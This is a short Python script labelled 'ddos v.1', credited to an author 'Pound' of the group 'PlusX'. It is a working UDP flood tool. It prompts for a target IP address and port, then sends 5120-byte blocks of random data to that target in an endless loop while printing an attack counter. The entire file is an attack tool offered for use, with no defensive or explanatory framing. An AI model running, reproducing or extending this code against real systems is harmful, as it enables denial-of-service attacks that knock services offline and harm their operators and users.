"""ddos v.1"""
import os, sys, time, socket, random

#####################
ddos = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(5120)
#####################

os.system("clear")
os.system("\tfiglet ddos v1")
print ("\tAuthor   : Pound")
print ("\tGroup    : PlusX")
print ("\tVersion  : 1")
print ("\tGithub   : https://github.com/Pound123")
IP = raw_input("\nIP    : ")
Port = input("Port  : ")
attacking = 1000
while True:
      ddos.sendto(bytes, (IP, Port))
      attacking = attacking + 1
      print ("Attacking %s Packet to %s Port:%s"%(attacking, IP, Port))



